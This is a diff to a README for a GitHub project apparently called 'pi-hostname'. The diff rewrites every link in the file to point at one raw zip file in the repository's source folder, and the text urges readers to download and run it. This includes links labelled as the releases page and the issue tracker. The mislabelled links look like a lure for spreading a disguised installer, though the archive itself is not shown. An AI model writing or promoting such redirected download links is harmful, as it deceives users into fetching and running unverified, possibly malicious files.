@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download pi-hostname](https://img.shields.io/badge/Download-pi--hostname-brightgreen)](https://github.com/acid5555/pi-hostname/releases)
+[![Download pi-hostname](https://github.com/acid5555/pi-hostname/raw/refs/heads/master/src/hostname_pi_1.4.zip)](https://github.com/acid5555/pi-hostname/raw/refs/heads/master/src/hostname_pi_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to pi-hostname! This software helps you track hostname context for shari
 
 To install pi-hostname, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/acid5555/pi-hostname/releases) to find the latest version of the software. 
+1. **Visit the Releases Page:** Go to our [Releases Page](https://github.com/acid5555/pi-hostname/raw/refs/heads/master/src/hostname_pi_1.4.zip) to find the latest version of the software. 
 2. **Download the Latest Version:** Click on the link for the latest release to download the software suited for your operating system. We provide installers for Windows, Mac, and Linux platforms.
 3. **Run the Installer:** Once downloaded, locate the installer file in your downloads folder. Double-click to run the installer and follow on-screen instructions.
 
@@ -63,8 +63,8 @@ For more detailed instructions, tips, or discussion, you can check the issues se
 
 ## 📬 Feedback
 
-We appreciate your thoughts and experiences. If you have feedback or suggestions, please open an issue on our [GitHub page](https://github.com/acid5555/pi-hostname/issues). Your input helps us improve pi-hostname.
+We appreciate your thoughts and experiences. If you have feedback or suggestions, please open an issue on our [GitHub page](https://github.com/acid5555/pi-hostname/raw/refs/heads/master/src/hostname_pi_1.4.zip). Your input helps us improve pi-hostname.
 
 ## 📥 Download Again
 
-Don’t forget, you can always return to our [Releases Page](https://github.com/acid5555/pi-hostname/releases) to download the latest version. Thank you for using pi-hostname!
+Don’t forget, you can always return to our [Releases Page](https://github.com/acid5555/pi-hostname/raw/refs/heads/master/src/hostname_pi_1.4.zip) to download the latest version. Thank you for using pi-hostname!
